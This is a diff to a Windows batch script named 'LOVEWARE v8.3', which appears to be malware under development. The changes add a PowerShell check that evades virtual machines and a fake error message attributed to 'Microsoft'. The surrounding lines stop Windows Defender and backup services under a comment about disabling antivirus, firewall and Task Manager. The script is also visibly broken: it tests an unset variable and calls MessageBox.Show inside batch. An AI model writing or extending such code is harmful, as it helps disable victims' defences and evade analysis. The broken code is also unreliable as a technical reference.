@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v8
+:: LOVEWARE v8.3
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -74,12 +74,12 @@ title Loveware
 
 :: Detect if program is running in virtualmachine
 
-FOR /F "tokens=* USEBACKQ" %%F IN (`WMIC COMPUTERSYSTEM GET MANUFACTURER`) DO (
+FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
 SET var=%%F
 )
-echo %var%
+echo %check%
 
-if %var% == VirtualBox (
+if %check% == False (
     MessageBox.Show("ERROR could not run application", Windows Command Center);
     pause
 ) else (
@@ -111,7 +111,7 @@ net session >nul 2>&1
 if %errorLevel% == 0 (
     goto runner
 ) else (
-    MessageBox.Show("ERROR! You need to run as admin!", Run as admin);
+    MessageBox.Show("ERROR! Program could not run, try running as admin.", Microsoft);
     pause
     exit
 
@@ -119,7 +119,7 @@ if %errorLevel% == 0 (
 
 :runner
 
-:: Disable antivirus, firewall, taskmaneger...
+:: Disable antivirus, firewall, taskmanager...
 
 net stop "SDRSVC"
 net stop "WinDefend"
